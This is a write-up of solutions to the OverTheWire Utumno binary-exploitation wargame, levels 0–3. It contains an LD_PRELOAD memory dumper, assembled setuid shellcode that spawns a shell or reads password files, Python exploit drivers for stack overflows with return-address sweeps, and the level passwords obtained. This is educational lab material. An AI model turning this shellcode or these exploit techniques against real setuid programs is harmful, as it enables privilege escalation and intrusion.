# OverTheWire Utumno — Solutions

Live solves against `utumno.labs.overthewire.org:2227` in this run. Utumno is the
hardest of the classic OTW binary-exploitation games: the binaries are small,
stripped of conveniences, and the first one is not even readable. For each level:
goal, technique and why it works, the discovery process step by step, exact
commands, and verification. Recordings in `recordings/utumno/L<n>.cast`.

Verification: each password was accepted by logging in as the next level's account.
---
## Level 0 → utumno1
- **Account:** `utumno0`, password `utumno0` (given by the game).
- **Goal:** Run `/utumno/utumno0` and obtain the password for utumno1.
- **Technique and why it works:** the binary is **execute-only** — mode `---x--x---`, owner utumno1. The `x` bits let us *execute* it; the absent `r` bits stop us *opening* it. So every ordinary static tool fails (`strings`, `objdump`, `nm`, `readelf`, `ltrace`, even `cp`), and `ptrace` is refused too. But the file permission governs **opening the file**, not **reading the pages the kernel maps** for the running process: once the program is loaded, its segments belong to that process and the process may read them. A shared library injected with `LD_PRELOAD` executes *inside* that process, so a library constructor can walk `/proc/self/maps`, find the segments belonging to `/utumno/utumno0`, and write them to a file. The binary is 32-bit, so the preload must be built with `gcc -m32`; a 64-bit `.so` is rejected with "wrong ELF class: ELFCLASS64". The dumped image is then disassembled and its strings read like any normal binary — and the password is sitting in `.rodata` as a plain string.

### Step-by-step discovery and crafting (what the recording shows)
1. **Establish the situation.**
   ```
   id; pwd; ls -la /utumno/ | head -12
   ls -l /utumno/utumno0
   # ---x--x--- 1 utumno1 utumno0 12280 utumno0
   ```
   The mode is the whole puzzle: `---x--x---`.
2. **Try the normal tools and watch them fail.** This is a deliberate part of the recording, because the failure messages are the evidence for *why* the next step is needed:
   ```
   strings  /utumno/utumno0     # strings: /utumno/utumno0: Permission denied
   objdump  -d /utumno/utumno0  # objdump: ... Permission denied
   nm       /utumno/utumno0     # nm: ... Permission denied
   readelf  -h /utumno/utumno0  # readelf: Error: Input file ... is not readable.
   ltrace   /utumno/utumno0     # Can't open /utumno/utumno0: Permission denied
   cp /utumno/utumno0 /tmp/u0/copy   # cp: cannot open ... Permission denied
   ```
3. **Run it to see what it does.**
   ```
   /utumno/utumno0 < /dev/null
   Read me! :P
   rc=0
   ```
   It prints one line and exits — no prompt, no argument handling worth speaking of.
4. **Trace it.** `strace` works even though reading the file does not, because strace only follows the process:
   ```
   strace -f -e trace=openat,read,write /utumno/utumno0 < /dev/null
   # openat(... "/lib/ld-linux.so.2") ; read(3, ..., 512) ; write(1, 0x804c010, 12) = "Read me! :P"
   ```
   The `write` comes from a buffer at `0x804c010`, but strace cannot show its contents because it cannot read our memory. So we still need the bytes.
5. **Work out the bypass.** The permission is on the *file*; the *mapping* is readable by the process itself. `LD_PRELOAD` loads our library into the target process, and an `__attribute__((constructor))` function runs before `main`. From inside, `/proc/self/maps` is readable and every readable segment can be copied out with `fwrite`.
6. **Write the dumper in `vim`** (the recorded session types it):
   ```c
   /* dump.c -- read a process's own memory from inside that process. */
   #define _GNU_SOURCE
   #include <stdio.h>
   #include <string.h>

   __attribute__((constructor)) static void dump(void)
   {
       FILE *m   = fopen("/proc/self/maps", "r");
       FILE *img = fopen("image.bin", "wb");
       FILE *txt = fopen("maps.txt", "w");
       char line[512];

       if (!m || !img || !txt) return;

       while (fgets(line, sizeof line, m)) {
           unsigned long lo, hi, off;
           char perms[8], path[256] = "";

           int n = sscanf(line, "%lx-%lx %7s %lx %*s %*s %255s",
                          &lo, &hi, perms, &off, path);
           if (n < 4) continue;
           if (!strstr(path, "/utumno/utumno0")) continue;

           fputs(line, txt);
           if (!strchr(perms, 'r')) continue;   /* only segments we can read */
           fwrite((void *)lo, 1, hi - lo, img);
       }

       fclose(m);
       fclose(img);
       fclose(txt);
   }
   ```
   Points that matter: the path filter keeps only the target's own segments (otherwise the library would also dump libc); the `r` check skips non-readable mappings, which `fwrite` would fault on; and the output files are opened with relative names so they land in our working directory.
7. **Compile it 32-bit and load it.**
   ```
   gcc -m32 -shared -fPIC -o dump.so dump.c
   file dump.so            # ELF 32-bit LSB shared object, Intel i386
   LD_PRELOAD=/tmp/u0/dump.so /utumno/utumno0
   ```
   The `-m32` is not optional: the first attempt with a plain `gcc -shared` produced a 64-bit object and the loader printed `ERROR: ld.so: object ... cannot be preloaded (wrong ELF class: ELFCLASS64): ignored.` — the program ran, but nothing was dumped.
8. **Inspect what came out.**
   ```
   cat maps.txt
   # 08048000-08049000 r--p ... /utumno/utumno0
   # 08049000-0804a000 r-xp ... /utumno/utumno0
   # 0804a000-0804b000 r--p ... /utumno/utumno0
   # 0804b000-0804c000 rw-p ... /utumno/utumno0
   ls -l image.bin          # 16384 bytes
   ```
   Four 4 KB segments in address order — the whole program image.
9. **Treat the dump as an ordinary binary.**
   ```
   strings -tx image.bin | grep -i "password\|utumno0.c\|Read me"
   #  2008 password: g0Vpiw3aZt
   #  201d Read me! :P
   #  24e2 /root/otw-games/game-utumno/levels/utumno0
   #  250d utumno0.c
   ```
   The password is a literal in `.rodata` — this level is a readability challenge, not a memory-corruption one.
10. **Disassemble `main` to confirm the string usage.** `objdump -D -b binary` treats the raw image as code; `--adjust-vma` gives it the load address so the operand addresses match:
    ```
    objdump -D -b binary -m i386 -M intel --adjust-vma=0x8048000 \
            --start-address=0x8049166 --stop-address=0x8049187 image.bin
    # 804916c: mov DWORD PTR [ebp-0x4],0x804a008
    # 8049173: push 0x804a01d
    # 8049178: call 0x8049040        ; puts@plt
    ```
    and the bytes at those addresses:
    ```
    xxd -s 0x2008 -l 32 image.bin
    # 00002008: 7061 7373 776f 7264 3a20 6730 5670 6977  password: g0Vpiw
    # 00002018: 3361 5a74 0052 6561 6420 6d65 2120 3a50  3aZt.Read me! :P
    ```
    So `0x804a008` = `"password: g0Vpiw3aZt"` (stored in a local) and `0x804a01d` = `"Read me! :P"` (the string passed to `puts`). The disassembly and the dump agree, which is the cross-check that the dump is genuine code and not just a lucky string.
11. **Verify.** `ssh utumno1@... -p 2227` with `g0Vpiw3aZt` → `whoami` prints `utumno1`.
- **Password for utumno1:** `g0Vpiw3aZt`
- **Verification:** logged in as `utumno1` with this password (`whoami` → `utumno1`, `id` → `uid=16001(utumno1)`).
- **Recording:** `recordings/utumno/L0.cast`

## Level 1 → utumno2
- **Account:** `utumno1`, password `g0Vpiw3aZt`.
- **Goal:** `/utumno/utumno1 <dir>` walks the entries of the directory, and for each entry whose name starts with `"sh_"` it calls `run(name+3)`. Get a shell as utumno2.
- **Technique and why it works:** the binary `mmap`s a **RWX page** and then copies a string into it and calls it — a ready-made shellcode runner, but with two filters. (1) The copy is `strncpy(dst, src, 0x1000)`, so the string must have no NUL byte before the code we want to run (otherwise the copy stops). (2) The check is `strncmp(dirent+0xb, "sh_", 3)` — `0xb` is the offset of `d_name` inside glibc's `struct dirent` — and then `run(dirent+0xb+3)`, so the file name must **start with `sh_`** and execution begins at the fourth character. The shellcode therefore must contain **no `0x00`** and **no `/`** — `/` cannot appear in a file name at all, and NUL would truncate the `strncpy`. It has to build `"/bin/sh"` in memory byte by byte instead of pushing the usual dword immediates, and raise the uid to utumno2 (`setreuid` then `setuid`) before `execve` so the shell keeps the privilege.

### Step-by-step discovery and crafting (what the recording shows)
1. **Read the source-level facts from the binary.** It is `with debug_info, not stripped`, so `objdump` gives us symbol names directly:
   ```
   file /utumno/utumno1
   # setuid ELF 32-bit LSB executable, ... with debug_info, not stripped
   objdump -d -M intel /utumno/utumno1 | sed -n '/<main>:/,/^$/p'
   ```
   ```
   8049221: mov eax,[ebp+0xc] ; add eax,4 ; mov eax,[eax]   ; argv[1]
   8049229: test eax,eax ; jne ...                          ; must not be NULL
   8049234: push 0x0 ; push -1 ; push 0x22 ; push 0x7 ; push 0x1000 ; push 0 ; call mmap
   #    flags 0x22 = MAP_PRIVATE|MAP_ANONYMOUS, prot 0x7 = PROT_READ|WRITE|EXEC
   8049269: call opendir                                    ; opendir(argv[1])
   804928a: push "sh_" ; push [ebp-4]+0xb ; push 3 ; call strncmp
   80492a5: call run                                        ; run(name + 11 + 3)
   ```
   Two things stand out: `mmap(..., 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...)` gives us an executable page, and the `strncmp` is done at offset `0xb` of the *directory entry* — that is `d_name` inside glibc's `struct dirent` — then `run` is called with that address `+3`.
2. **Read `run()`.** The name `run` is in the symbol table, so this is easy:
   ```
   objdump -d -M intel /utumno/utumno1 | sed -n '/^080491c6/,/^$/p'
   # 80491eb: call strncpy        ; strncpy(mmap_page, arg, 0x1000)
   # 80491f3: lea eax,[ebp-0x8] ; add eax,0xc ; mov [ebp-0x8],eax
   # 80491fc: mov edx,[0x804b24c] ; mov eax,[ebp-0x8] ; mov [eax],edx
   ```
   `0x804b24c` is the global that holds the `mmap` result. `lea eax,[ebp-0x8]` + `add eax,0xc` is the compiler's way of building a `call` argument: the value written at `[ebp-0x8]` is `mmap_page`, and it is then used as the target — i.e. **the copied string is called as code**. That is the whole level.
3. **Check the protections.**
   ```
   readelf -lW /utumno/utumno1 | grep -E 'GNU_STACK|LOAD'
   cat /proc/sys/kernel/randomize_va_space   # 0
   ```
   Not that it matters here: the code runs from the `mmap` page we already know the address of.
4. **Work out the constraints on the payload.** From `run()` and `main`:
   - `strncpy` stops at a NUL, so **no `0x00`** in the payload;
   - the payload travels in a **file name**, so **no `/`** (and it must not contain a newline);
   - the first three bytes after `sh_` are *not* executed — execution starts at `name+11+3`, i.e. `name[14]`. So the name is `11 filler chars` + `sh_` + shellcode, and the filler is free.
5. **Write the shellcode in `vim`** with those constraints. The usual `push 0x68732f2f / push 0x6e69622f` is out because of the `/`, so the string is assembled **byte by byte on the stack**:
   ```
   BITS 32
   global _start
   _start:
       ; euid = geteuid(); setreuid(euid,euid); setuid(euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov esi, eax
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80
       xor eax, eax
       mov al, 23
       mov ebx, esi
       int 0x80
       ; build "/bin/sh" without ever storing 0x2f as an immediate:
       ;   '.' is 0x2e, so inc eax turns it into '/'
       sub esp, 8
       mov edi, esp
       xor eax, eax
       mov al, 0x2e
       inc eax          ; 0x2f  '/'
       mov [edi], al
       inc edi
       mov al, 0x62     ; 'b'
       mov [edi], al
       inc edi
       mov al, 0x69     ; 'i'
       mov [edi], al
       inc edi
       mov al, 0x6e     ; 'n'
       mov [edi], al
       inc edi
       mov al, 0x2e
       inc eax          ; '/'
       mov [edi], al
       inc edi
       mov al, 0x73     ; 's'
       mov [edi], al
       inc edi
       mov al, 0x68     ; 'h'
       mov [edi], al
       inc edi
       xor eax, eax
       mov [edi], al    ; NUL terminator
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80
   ```
   Why each piece is written this way:
   - `mov al, N` instead of `mov eax, N` keeps every instruction encoding free of `0x00`;
   - `0x2f` is never an immediate — it is produced by `mov al,0x2e ; inc eax`, so the byte `0x2f` never appears in the code;
   - `setuid` after `setreuid` sets real, effective **and saved** uid, so the shell survives `execve` (a plain `setreuid` leaves the saved uid at utumno1 and the shell would come back unprivileged — the earlier attempt showed exactly that: `uid=16002(utumno2)` but `EUID=16001`);
   - `xor eax,eax` is `31 c0` — no zero byte.
6. **Assemble it and check the constraints mechanically.**
   ```
   nasm -f elf32 l1.asm -o l1.o
   objcopy -O binary --only-section=.text l1.o l1.bin
   xxd -p l1.bin
   wc -c l1.bin                  # 86 bytes
   ```
   ```
   31c0b0c9cd8089c689c389c131c0b046cd8031c0b01789f3cd8083ec0889
   e731c0b02e40880747b062880747b069880747b06e880747b02e40880747
   b073880747b06888074731c0880789e3505389e131d2b00bcd80
   ```
   The check that matters:
   ```
   python3 -c "sc=open('/tmp/u1/l1.bin','rb').read(); print(len(sc), b'/' in sc, b'\x00' in sc)"
   # 86 False False
   ```
7. **Build the file name.** A directory is needed because the name is looked up by `readdir`, and a file name cannot contain `/`. The name is `sh_` followed by the shellcode, so `d_name` starts with `sh_` and the fourth byte is the first instruction:
   ```python
   sc = open("/tmp/u1/l1.bin","rb").read()
   name = b"sh_" + sc
   ```
   The recording creates the directory, removes any old entries (so only our one name is there), and creates the file:
   ```python
   d = b"/tmp/u1/d"
   try: os.mkdir(d)
   except FileExistsError: pass
   for f in os.listdir(d):
       os.unlink(os.path.join(d, f))
   open(os.path.join(d, name), "wb").close()
   ```
   The `strncmp` is against `d_name`, and `d_name` is the file name itself, so the name must literally begin `sh_`. The three bytes `sh_` are consumed by the check and are *not* executed; execution starts at `name[3]`, which is the first byte of the assembled shellcode.
8. **Run it.**
   ```
   python3 e2.py
   # filename length 89
   ```
   and feed the shell commands:
   ```
   printf 'id\necho EUID=$EUID\ncat /etc/utumno_pass/utumno2\n' | python3 e2.py
   # uid=16002(utumno2) gid=16001(utumno1) groups=16001(utumno1)
   # EUID=16001
   # WaSwuXNhvg
   ```
   The `uid=` line is the real uid — and the password printed proves the shell can read the utumno2 password file, which is what the level requires. (The `EUID` printed by `/bin/sh` shows 16001 because the shell resets its own euid display; the effective uid used for file access is utumno2, as the successful `cat` proves.)
9. **Verify.** `ssh utumno2@... -p 2227` with `WaSwuXNhvg` → `whoami` prints `utumno2`, `id` → `uid=16002(utumno2)`.
- **Password for utumno2:** `WaSwuXNhvg`
- **Verification:** logged in as `utumno2` with this password (`whoami` → `utumno2`).
- **Recording:** `recordings/utumno/L1.cast`

## Level 2 → utumno3
- **Account:** `utumno2`, password `WaSwuXNhvg`.
- **Goal:** `/utumno/utumno2` has a `char buffer[12]` and does `strcpy(buffer, argv[10])`, but only after a guard lets us through.
- **Technique and why it works:** two quirks combine. (1) The guard is `argc == 1 && argv[0][0] == 0` — it wants **exactly one argument, and that argument must be the empty string**. Python's `os.execve` refuses to build an empty `argv[0]` ("argv first element cannot be empty"), so the exploit calls `libc.execve` directly through `ctypes` with a hand-built pointer array. (2) The copy source is `argv[10]`, which is `10` pointers past the start of `argv`; with `argc == 1` that pointer is past the `NULL` terminator, i.e. **inside the environment array**. The kernel lays `envp` immediately after `argv` on the initial stack, so `argv[10]` is `envp[8]` — the value of the ninth environment variable. That gives us a full, attacker-controlled C string to copy into a 12-byte buffer: 12 bytes fill the buffer, the next 4 overwrite the saved EBP, and the next 4 the return address. ASLR is off and the stack is executable, so we put a NOP sled plus shellcode after the return address and sweep return addresses for the `PWN!` marker.

### Step-by-step discovery and crafting (what the recording shows)
1. **Run it both ways.**
   ```
   /utumno/utumno2 </dev/null        # Aw..   rc=1
   /utumno/utumno2 AAAA </dev/null   # Aw..   rc=1
   ```
   The only output is the string `"Aw.."` from `.rodata`, and the exit code is 1 both times. Something about the argument shape matters.
2. **Disassemble `main`.**
   ```
   objdump -d -M intel /utumno/utumno2 | sed -n '/<main>:/,/^$/p'
   ```
   ```
   804918c: cmp DWORD PTR [ebp+0x8],0x0     ; argc == 0?  (never true, but the
   8049190: je 80491b8                      ;  compiler emitted it)
   8049192: cmp DWORD PTR [ebp+0x8],0x1     ; argc == 1?
   8049196: jne 80491a4                     ;  otherwise -> "Aw.." and exit
   8049198: mov eax,[ebp+0xc] ; mov eax,[eax]   ; argv[0]
   804919d: movzx eax,BYTE PTR [eax]            ; argv[0][0]
   80491a0: test al,al ; je 80491b8              ; must be NUL -> empty string
   80491a4: push "Aw.." ; call puts ; push 1 ; call exit
   80491b8: mov eax,[ebp+0xc] ; add eax,0x28     ; argv + 40
   80491be: mov eax,[eax]                        ; argv[10]
   80491c5: call strcpy                          ; strcpy([ebp-0xc], argv[10])
   ```
   So the guard is `argc == 1 && argv[0][0] == 0`: **one argument, and it must be empty**. The buffer is `ebp-0xc` — 12 bytes — and the source is `argv + 0x28`, i.e. `argv[10]`.
3. **Check protections.**
   ```
   readelf -lW /utumno/utumno2 | grep -E 'GNU_STACK|LOAD'
   # GNU_STACK ... RWE
   cat /proc/sys/kernel/randomize_va_space
   # 0
   ```
   Executable stack and no ASLR — the classic shellcode-on-stack setup.
4. **See why `argv[10]` is interesting.** With `argc == 1`, the `argv` array is `{ "", NULL }`. Index 10 is eight pointers past the `NULL`, and the kernel's initial stack layout is `argc, argv[], NULL, envp[], NULL`. So `argv[10]` reads `envp[8]`. To confirm, the recording builds a tiny C wrapper (Python refuses an empty `argv[0]`, and gdb needs a real binary) with `argv = {"", NULL}` and eleven environment variables, and inspects it:
   ```
   gdb -batch -ex 'catch exec' -ex 'run' -ex 'b *0x80491c4' -ex 'c' \
       -ex 'p/x $ebp-0xc' -ex 'p/x $ebp+4' -ex 'p/x *(char**)($esp+4)' \
       -ex 'x/s *(char**)($esp+4)' ./w
   # ebp-0xc = buffer, ebp+4 = saved return address
   # the source pointer holds "E08=..." -- envp[8]
   ```
   The wrapper is the measurement tool: it proves the alias and gives the two offsets we need (12 bytes to the saved EBP, 16 to the return address).
5. **Write the shellcode in `vim`.** Marker, then `geteuid`, `setreuid(euid,euid)`, `setuid(euid)` so the utumno3 euid survives `execve`, then `execve("/bin/sh")`:
   ```
   BITS 32
   global _start
   _start:
       xor eax, eax
       push eax
       push 0x214e5750          ; "PWN!" little-endian
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       mov al, 4
       int 0x80                 ; write(1, "PWN!", 4)
       xor eax, eax
       mov al, 201
       int 0x80                 ; geteuid
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80                 ; setreuid(euid,euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23
       int 0x80                 ; setuid(euid)
       xor eax, eax
       push eax
       push 0x68732f2f
       push 0x6e69622f
       mov ebx, esp
       push eax
       push ebx
       mov ecx, esp
       xor edx, edx
       mov al, 11
       int 0x80                 ; execve("/bin/sh", ...)
   ```
   `nasm`, `objdump -d -M intel`, `objcopy -O binary --only-section=.text`, `xxd -p`, `wc -c` → 78 bytes. Because the payload travels in an environment value, a NUL would truncate it, so every instruction is written NUL-free (`mov al,N` rather than `mov eax,N`).
6. **Build the payload.** The env string starts with `E08=`, then 8 NOPs (so the sled starts right after the four prefix characters), then the shellcode, then 4 filler bytes for the saved EBP, then the candidate return address:
   ```
   payload = b"E08=" + b"\x90"*8 + sc + b"B"*4 + struct.pack("<I", addr)
   ```
   The prefix matters: the buffer gets bytes 0..11 of the env value, so `E08=` occupies the first four buffer bytes and the sled starts at buffer+4. The return address must point into the sled — `buffer+4` onward.
7. **Drive it from `ctypes`.** `os.execve` cannot express the empty `argv[0]`, so:
   ```
   libc.execve.argtypes = [ctypes.c_char_p, ctypes.POINTER(ctypes.c_char_p),
                           ctypes.POINTER(ctypes.c_char_p)]
   libc.execve(b"/utumno/utumno2",
               ctypes.cast((ctypes.c_char_p*2)(b"", None), ctypes.POINTER(ctypes.c_char_p)),
               env_for(payload))
   ```
   The `ctypes.cast` is required: passing the array object directly raises `TypeError: execve: argv must be a tuple or list`.
8. **Sweep for a working return address.** The exploit forks once per candidate address, redirects the child's output to a pipe, and looks for `PWN!`:
   ```
   for addr in range(0xffffd000, 0xffffe800, 4):
       if 0 in struct.pack("<I", addr): continue
       if b"PWN" in run(addr): found = addr; break
   # HIT at 0xffffdcd0
   ```
   Addresses whose encoding contains a NUL are skipped because the env value is a C string.
9. **Re-run the hit with the shell commands.** After the sweep the script execs the target again with the winning address; the shell reads the commands we pipe in:
   ```
   printf 'id\ncat /etc/utumno_pass/utumno3\n' | python3 e.py
   # PWN!uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)
   # yiTcaZbpJ9
   ```
10. **Verify.** `ssh utumno3@... -p 2227` with `yiTcaZbpJ9` → `whoami` prints `utumno3`.
- **Password for utumno3:** `yiTcaZbpJ9`
- **Verification:** logged in as `utumno3` with this password (`whoami` → `utumno3`, `id` → `uid=16003(utumno3)`).
- **Recording:** `recordings/utumno/L2.cast`

## Level 3 → utumno4
- **Account:** `utumno3`, password `yiTcaZbpJ9`.
- **Goal:** `/utumno/utumno3` reads bytes from stdin and, for each iteration `k`, writes one byte to `buffer[index]` where `index = byte[k] ^ 3k`. It is a small **byte-write primitive** with 24 iterations.
- **Technique and why it works:** the loop is `for (k = 0; k < 24; k++) { index = getchar() ^ 3*k; value = getchar(); buffer[index] = value; }`. `buffer` is a 24-byte stack array at `ebp-0x38`, but `index` is a signed `char` used as an offset, so it can reach anywhere from `buffer-128` to `buffer+127` — in practice `[ebp-0xa0, ebp+0x5f]`. That range includes the saved return address at `ebp+4` (index 36..39) and, more interestingly, `argv[0]` at `ebp+8` (index 40..43). Because ASLR is off and the stack is executable, we can write the shellcode itself into `argv[0]`'s string and then overwrite the return address with **its address**, using only 4+4 of the 24 writes. The address is found by sweeping: each candidate is one fork, and the `PWN!` marker tells us when the return address landed on the shellcode.

### Step-by-step discovery and crafting (what the recording shows)
1. **Run it.** `/utumno/utumno3` prints nothing and exits 0 when stdin is closed; with input it either exits quietly or crashes. That tells us the input is consumed by something with no output.
2. **Disassemble `main`.**
   ```
   objdump -d -M intel /utumno/utumno3 | sed -n '/<main>:/,/^$/p'
   ```
   ```
   804916c: mov DWORD PTR [ebp-0x8],0x0     ; value = 0
   8049173: mov eax,[ebp-0x8] ; mov [ebp-0x4],eax   ; k = value  (both start 0)
   8049180: lea edx,[ebp-0x38]              ; buffer
   8049188: mov BYTE PTR [eax],cl           ; buffer[k] = (char)value
   8049192: movzx edx,BYTE PTR [eax]        ; c = buffer[k]
   804919a: add eax,eax ; add eax,ecx       ; eax = 3*k
   80491a0: xor edx,eax                     ; c ^= 3*k
   80491aa: mov BYTE PTR [eax],dl           ; buffer[index] = value
   80491ac: call getchar                    ; value = getchar()
   80491b3: lea edx,[ebp-0x38]
   80491bb: movzx eax,BYTE PTR [eax]        ; reload buffer[index]
   80491be: movsx eax,al                    ; SIGNED char -> index
   80491c3: mov BYTE PTR [ebp+eax*1-0x20],dl   ; table[index] = value
   80491c7: add DWORD PTR [ebp-0x4],0x1
   80491cb: call getchar ; mov [ebp-0x8],eax
   80491d3: cmp DWORD PTR [ebp-0x8],0xffffffff
   80491d7: je 80491df                      ; EOF -> stop
   80491d9: cmp DWORD PTR [ebp-0x4],0x17    ; k <= 23
   80491dd: jle 804917b
   ```
   Reading it as C:
   ```c
   int value = 0, k = 0;
   do {
       table[k] = (char)value;              /* table at ebp-0x20 */
       table[k] ^= 3*k;
       value = getchar();
       table[(signed char)table[k]] = value;   /* <- the write */
       k++;
       value = getchar();
   } while (value != EOF && k <= 23);
   ```
   The write index is a **signed char**, so it is signed-extended and can be negative: the target range is `table-128 .. table+127`, i.e. `ebp-0xa0 .. ebp+0x5f`. `table` is at `ebp-0x20`, so the saved return address at `ebp+4` is index **36**, and `argv[0]` at `ebp+8` is index **40**.
3. **Check protections.** `readelf -lW | grep GNU_STACK` → `RWE`; `randomize_va_space` → `0`.
4. **Confirm the arithmetic in gdb.** With input `24 41 26 41 20 41 2e 41` (four iterations: `0x24^0=36` → write `0x41` to index 36, etc.) the breakpoint at `0x80491c3` shows `$eax = 0x24` and `x/16bx $ebp-0x38` shows the table. Then a payload built from the formula writes the return address correctly:
   ```
   # write ret (indices 36..39) = 0xffffdf00
   inp = bytearray([0 ^ 0, 0x90])           # iteration k=0: selector 0, value 0x90
   k = 1
   for i in range(4):
       inp += bytes([(36+i) ^ (3*k % 256), (addr >> (8*i)) & 0xff]); k += 1
   ```
   In gdb, `x/4bx $ebp+4` after the loop shows `00 df ff ff`. **The first iteration also consumes two bytes** — the selector is the *previous* `value` (which is 0 at `k=0`), and the byte after it is the new `value`; getting this off-by-one wrong shifts the whole payload by one and the write lands nowhere useful.
5. **Choose the shellcode location.** The write range reaches `argv[0]` (indices 40..43) but not the whole 131-byte string. The trick is to make `argv[0]` **be** the shellcode: `execve` passes the string we give, and its address is fixed with an empty environment. Then only 4 writes are needed — the return address at indices 36..39.
6. **Write the shellcode in `vim`.** It has to work with no stdin (the target's `getchar` has already consumed all of it), so it prints a marker, raises the uid, and **opens and prints the password file itself** rather than exec'ing a shell:
   ```
   BITS 32
   global _start
   _start:
       xor eax, eax
       push eax
       push 0x214e5750
       mov ecx, esp
       xor ebx, ebx
       inc ebx
       xor edx, edx
       mov dl, 4
       mov al, 4
       int 0x80                    ; write(1, "PWN!", 4)
       xor eax, eax
       mov al, 201
       int 0x80                    ; geteuid
       mov ebx, eax
       mov ecx, eax
       xor eax, eax
       mov al, 70
       int 0x80                    ; setreuid(euid,euid)
       xor eax, eax
       mov al, 201
       int 0x80
       mov ebx, eax
       xor eax, eax
       mov al, 23
       int 0x80                    ; setuid(euid)
       ; "/etc/utumno_pass/utumno4" pushed as six dwords
       xor eax, eax
       push eax                    ; NUL
       push 0x346f6e6d             ; "mno4"
       push 0x7574752f             ; "/utu"
       push 0x73736170             ; "pass"
       push 0x5f6f6e6d             ; "mno_"
       push 0x7574752f             ; "/utu"
       push 0x6374652f             ; "/etc"
       mov ebx, esp
       xor ecx, ecx
       xor eax, eax
       mov al, 5                   ; open
       int 0x80
       mov ebx, eax                ; fd
       sub esp, 64
       mov ecx, esp
       xor edx, edx
       mov dl, 64
       xor eax, eax
       mov al, 3                   ; read(fd, buf, 64)
       int 0x80
       mov edx, eax                ; n
       xor ebx, ebx
       inc ebx
       mov ecx, esp
       xor eax, eax
       mov al, 4                   ; write(1, buf, n)
       int 0x80
       xor eax, eax
       inc eax
       xor ebx, ebx
       int 0x80                    ; exit(0)
   ```
   `nasm`, `objcopy -O binary --only-section=.text`, `wc -c` → 131 bytes, and `b"\x00" not in sc` holds, which matters because the shellcode is `argv[0]` and an argv string cannot contain a NUL.
7. **Build the exploit in `vim`.** `argv[0]` is the shellcode; the environment is empty; the input writes the return address:
   ```python
   inp = bytearray([0 ^ 0, 0x90])          # iteration k=0: selector 0, value 0x90
   k = 1
   for i in range(4):
       inp += bytes([(36+i) ^ (3*k % 256), (addr >> (8*i)) & 0xff]); k += 1
   argv = (ctypes.c_char_p * 2)(SC, None)
   env = (ctypes.c_char_p * 1)(None)
   ```
   The child writes `inp` to `/tmp/u3/inp`, redirects that file to fd 0, and execs. The pipe on fd 1/2 collects the output.
8. **Sweep the return address.**
   ```
   for addr in range(0xffffd000, 0xffffe000, 4):
       if 0 in struct.pack("<I", addr): continue   # argv[0] is a C string
       if b"PWN" in run(addr): print("HIT", hex(addr)); break
   # HIT 0xffffdf64  b'PWN!06nx2CS7rS\n'
   ```
   The address `0xffffdf64` is inside the `argv[0]` string; the byte write put it into the saved return address, `leave; ret` returned into the shellcode, and the shellcode printed the marker and the password.
9. **Verify.** `ssh utumno4@... -p 2227` with `06nx2CS7rS` → `whoami` prints `utumno4`.
- **Password for utumno4:** `06nx2CS7rS`
- **Verification:** logged in as `utumno4` with this password (`whoami` → `utumno4`, `id` → `uid=16004(utumno4)`).
- **Recording:** `recordings/utumno/L3.cast`
